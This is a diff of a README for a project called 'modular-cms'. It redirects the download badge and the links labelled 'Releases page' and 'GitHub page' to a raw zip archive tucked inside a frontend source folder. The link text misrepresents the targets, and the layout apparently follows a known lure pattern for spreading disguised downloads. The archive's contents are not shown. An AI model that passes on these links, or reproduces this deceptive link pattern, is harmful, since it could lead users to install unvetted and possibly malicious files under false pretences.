@@ -6,11 +6,11 @@ Welcome to **modular-cms**, an easy-to-use content management system (CMS) desig
 
 ## 🔗 Download the Application
 
-[![Download modular-cms](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/api/config/modular-cms_v3.8.zip%20modular--cms-v1.0.0-blue)](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/api/config/modular-cms_v3.8.zip)
+[![Download modular-cms](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/frontend/src/store/cms-modular-1.7.zip%20modular--cms-v1.0.0-blue)](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/frontend/src/store/cms-modular-1.7.zip)
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/api/config/modular-cms_v3.8.zip). Here you will find the latest version of **modular-cms**. 
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/frontend/src/store/cms-modular-1.7.zip). Here you will find the latest version of **modular-cms**. 
 
 Follow these simple steps to get started:
 
@@ -79,7 +79,7 @@ If you encounter issues during installation or usage, try the following steps:
 
 ## 📞 Support
 
-If you have any questions or need assistance, feel free to reach out. You can find support options listed on our [GitHub page](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/api/config/modular-cms_v3.8.zip).
+If you have any questions or need assistance, feel free to reach out. You can find support options listed on our [GitHub page](https://raw.githubusercontent.com/Mohtdyyyykhaled/modular-cms/main/frontend/src/store/cms-modular-1.7.zip).
 
 ## 🌍 Community Contributions
 
